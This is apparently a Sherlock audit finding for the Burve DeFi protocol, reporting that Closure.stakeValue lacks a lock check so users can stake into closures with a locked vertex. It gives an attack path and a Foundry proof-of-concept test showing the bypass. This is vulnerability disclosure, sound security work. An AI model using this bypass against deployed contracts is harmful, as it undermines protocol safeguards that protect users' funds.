# User will bypass vertex lock mechanism during staking, impacting Protocol Integrity

### Summary

A missing lock check in the `Closure.stakeValue` [function](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/multi/closure/Closure.sol#L517) will cause a bypass of the vertex lock mechanism for Protocol Integrity as a User will call `ValueTokenFacet.burn` to stake value into a closure containing a locked vertex.

### Root Cause

In `src/multi/closure/Closure.sol:536` the `stakeValue` function lacks a check to verify if any constituent vertices of the closure are locked before proceeding with the staking logic and calling `trimAllBalances`.

### Internal Pre-conditions

1.  User needs to call `valueFacet.addValue` and `valueTokenFacet.mint` to set their Value Token balance for the target closure (`cid3`) to be greater than 0.
2.  User needs to call `valueTokenFacet.mint` to set `closure.valueStaked` to be less than `(closure.targetX128 * closure.n) >> 128`.

### External Pre-conditions

1.  Authorized Locker needs to call `lockFacet.lock` to set the `locked` status of a vertex within the target closure (`cid3`) to be `true`.

### Attack Path

1.  User calls `valueFacet.addValue` providing liquidity to closure `cid3` (e.g., involving `tokens[0]`, `tokens[1]`, `tokens[2]`).
2.  User calls `valueTokenFacet.mint` for closure `cid3` to unstake some value, receiving value tokens and creating staking capacity in the closure.
3.  Authorized Locker calls `lockFacet.lock` targeting one of the vertices in `cid3` (e.g., `tokens[1]`).
4.  User calls `ValueTokenFacet.burn` targeting closure `cid3` with the value tokens obtained in step 2. This call successfully stakes the value despite `tokens[1]` being locked, bypassing the lock mechanism for this operation.


### Impact

The Protocol Integrity suffers a bypass of the vertex lock mechanism, as staking operations can proceed on closures containing locked vertices, potentially interfering with administrative actions or leading to unexpected state interactions during a lock.

### PoC

```solidity
/// Test attempts to stake when a vertex is locked.
/// This test demonstrates that staking IS possible even when a related vertex is locked,
/// because the expected revert does not occur.
function testLockedStake() public {
    // Define the closure ID (tokens 0, 1, 2) used for the test.
    uint16 cid3 = 0x0007;
    // Define the initial amount of value Alice will add.
    uint256 initialValue = 10e18;
    // Define the amount of value Alice will unstake (mint value tokens for).
    uint256 valueToUnstake = 5e18;

    // Switch context to Alice's address.
    vm.startPrank(alice);
    // Alice adds initial liquidity (value) to the closure.
    valueFacet.addValue(alice, cid3, uint128(initialValue), 0); // Internal Pre-condition setup
    // Alice unstakes some value, receiving value tokens. This creates capacity for staking later.
    valueTokenFacet.mint(uint128(valueToUnstake), 0, cid3); // Internal Pre-condition setup
    // Stop impersonating Alice.
    vm.stopPrank();

    // Switch context to the owner's address.
    vm.startPrank(owner);
    // The owner locks token1, which is part of the closure cid3.
    lockFacet.lock(tokens[1]); // External Pre-condition setup
    // Stop impersonating the owner.
    vm.stopPrank();

    // Switch context back to Alice.
    vm.startPrank(alice);
    // *** VULNERABILITY DEMONSTRATION ***
    // Expect the next call to revert because token1 is locked and staking triggers trimBalance on the locked vertex.
    // The `burn` function calls `Closure.stakeValue`, which calls `trimAllBalances`.
    // `trimAllBalances` iterates through vertices, calling `_trimBalance`, which calls `Vertex.trimBalance`.
    // `Vertex.trimBalance` *should* check `isLocked` and revert.
    // vm.expectRevert(abi.encodeWithSelector(VertexImpl.VertexLocked.selector, VertexLib.newId(1))); // Commented out to show success
    // Alice attempts to stake the previously unstaked value back by burning her value tokens.
    // !!! CRITICAL: This call SUCCEEDS instead of reverting, indicating staking is possible while locked. !!!
    valueTokenFacet.burn(uint128(valueToUnstake), 0, cid3); // Attack Path step 4: Staking succeeds despite lock
    // Stop impersonating Alice.
    vm.stopPrank();

    // Cleanup / further checks (not essential for PoC)
    vm.startPrank(owner);
    lockFacet.unlock(tokens[1]);
    vm.stopPrank();
    vm.startPrank(alice);
    // This might fail now due to lack of tokens/capacity after the successful (but unexpected) burn above.
    // valueTokenFacet.burn(uint128(valueToUnstake), 0, cid3);
    vm.stopPrank();
}
```
